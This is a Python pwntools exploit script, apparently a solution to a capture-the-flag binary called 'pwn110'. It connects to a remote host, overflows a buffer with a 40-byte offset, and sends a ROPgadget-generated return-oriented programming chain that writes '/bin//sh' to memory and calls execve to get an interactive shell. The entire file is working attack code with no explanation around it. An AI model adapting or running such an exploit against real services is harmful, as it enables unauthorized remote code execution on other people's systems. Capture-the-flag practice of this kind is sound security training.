# Generated by ROPgadget --binary pwn110-1644300525386.pwn110 --ropchain


from pwn import *
from struct import pack

elf = context.binary = ELF('./pwn110-1644300525386.pwn110', checksec=False)
context.log_level = 'debug'

# io = process()
io = remote('10.10.19.101', 9010)

offset = 40


payload = b'A' * offset

payload += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
payload += pack('<Q', 0x00000000004c00e0) # @ .data
payload += pack('<Q', 0x00000000004497d7) # pop rax ; ret
payload += b'/bin//sh'
payload += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
payload += pack('<Q', 0x00000000004c00e8) # @ .data + 8
payload += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x000000000040191a) # pop rdi ; ret
payload += pack('<Q', 0x00000000004c00e0) # @ .data
payload += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
payload += pack('<Q', 0x00000000004c00e8) # @ .data + 8
payload += pack('<Q', 0x000000000040181f) # pop rdx ; ret
payload += pack('<Q', 0x00000000004c00e8) # @ .data + 8
payload += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret

# Replace the excessive `add rax, 1` instructions with direct `pop rax`
payload += pack('<Q', 0x00000000004497d7) # pop rax ; ret
payload += pack('<Q', 59)  # Syscall number for execve

payload += pack('<Q', 0x00000000004012d3) # syscall

io.sendline(payload)
io.interactive()
